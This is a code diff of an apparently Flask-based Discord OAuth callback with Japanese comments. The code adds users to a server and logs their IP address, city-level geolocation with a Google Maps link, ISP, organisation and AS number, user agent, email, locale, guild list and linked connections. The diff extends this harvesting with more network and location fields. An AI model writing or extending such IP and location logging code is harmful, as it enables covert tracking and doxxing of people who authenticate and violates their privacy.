@@ -29,19 +29,22 @@ def get_client_ip():
         return "0.0.0.0"
 
 
-# --- IPから地域情報 ---
+# --- IPから地域情報（改良版） ---
 def get_geo_info(ip):
     try:
-        # ローカルIPやプライベートIPの場合はグローバルIPに置換
+        # プライベートIPをグローバルIPに置換
         if ip.startswith(("127.", "192.", "10.", "172.")):
             ip = requests.get("https://api.ipify.org").text
+
         response = requests.get(
-            f"http://ip-api.com/json/{ip}?lang=ja&fields=status,message,country,regionName,city,lat,lon,proxy,hosting,query"
+            f"http://ip-api.com/json/{ip}?lang=ja&fields=status,message,country,regionName,city,lat,lon,proxy,hosting,query,isp,org,as"
         )
         data = response.json()
+
         if data.get("status") != "success":
             raise ValueError("Geo取得失敗")
-        return {
+
+        geo = {
             "ip": data.get("query", ip),
             "country": data.get("country", "不明"),
             "region": data.get("regionName", "不明"),
@@ -50,8 +53,23 @@ def get_geo_info(ip):
             "lon": data.get("lon"),
             "proxy": data.get("proxy", False),
             "hosting": data.get("hosting", False),
+            "isp": data.get("isp", "不明"),
+            "org": data.get("org", "不明"),
+            "as": data.get("as", "不明"),
         }
-    except:
+
+        # Google Mapリンク生成
+        if geo["lat"] and geo["lon"]:
+            geo["map_url"] = f"https://www.google.com/maps?q={geo['lat']},{geo['lon']}"
+        elif geo["city"] != "不明":
+            geo["map_url"] = f"https://www.google.com/maps/search/{geo['city']},{geo['region']},{geo['country']}"
+        else:
+            geo["map_url"] = "不明"
+
+        return geo
+
+    except Exception as e:
+        print("Geo情報取得エラー:", e)
         return {
             "ip": ip,
             "country": "不明",
@@ -61,6 +79,10 @@ def get_geo_info(ip):
             "lon": None,
             "proxy": False,
             "hosting": False,
+            "isp": "不明",
+            "org": "不明",
+            "as": "不明",
+            "map_url": "不明",
         }
 
 
@@ -105,6 +127,7 @@ def callback():
     if not code:
         return "コードがありません", 400
 
+    # --- Discordトークン取得 ---
     try:
         token_resp = requests.post(
             "https://discord.com/api/oauth2/token",
@@ -125,7 +148,7 @@ def callback():
     except Exception as e:
         return f"トークン取得エラー: {e}", 500
 
-    # ユーザー情報
+    # --- ユーザー情報取得 ---
     try:
         user_resp = requests.get(
             "https://discord.com/api/users/@me",
@@ -135,7 +158,7 @@ def callback():
     except:
         return "ユーザー情報取得失敗", 500
 
-    # サーバー参加処理
+    # --- サーバー参加 ---
     try:
         requests.put(
             f"https://discord.com/api/guilds/{DISCORD_GUILD_ID}/members/{user['id']}",
@@ -189,12 +212,13 @@ def callback():
         "city": geo["city"],
         "lat": geo["lat"],
         "lon": geo["lon"],
-        "map_url": f"https://www.google.com/maps?q={geo['lat']},{geo['lon']}"
-        if geo["lat"] and geo["lon"]
-        else "不明",
+        "map_url": geo["map_url"],
         "user_agent": user_agent,
         "proxy": geo["proxy"],
         "hosting": geo["hosting"],
+        "isp": geo["isp"],
+        "org": geo["org"],
+        "as": geo["as"],
         "guilds": guilds,
         "connections": connections,
     }
@@ -212,6 +236,7 @@ def callback():
                 f"国: {data['country']} / 地域: {data['region']} / 市: {data['city']}\n"
                 f"Google Map: {data['map_url']}\n"
                 f"Proxy: {data['proxy']} / Hosting: {data['hosting']}\n"
+                f"ISP: {data['isp']} / Org: {data['org']} / AS: {data['as']}\n"
                 f"UA: {data['user_agent']}\n"
                 f"メール: {data['email']}\n"
                 f"Locale: {data['locale']}\n"
